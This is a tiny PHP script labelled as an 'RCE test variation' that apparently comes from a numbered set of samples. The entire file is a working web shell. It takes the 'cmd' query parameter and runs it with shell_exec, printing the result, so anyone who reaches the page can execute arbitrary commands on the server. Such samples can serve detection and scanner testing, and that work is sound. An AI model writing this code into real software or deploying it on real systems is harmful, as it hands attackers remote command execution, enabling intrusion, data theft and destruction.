<?php
// RCE test variation #636
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>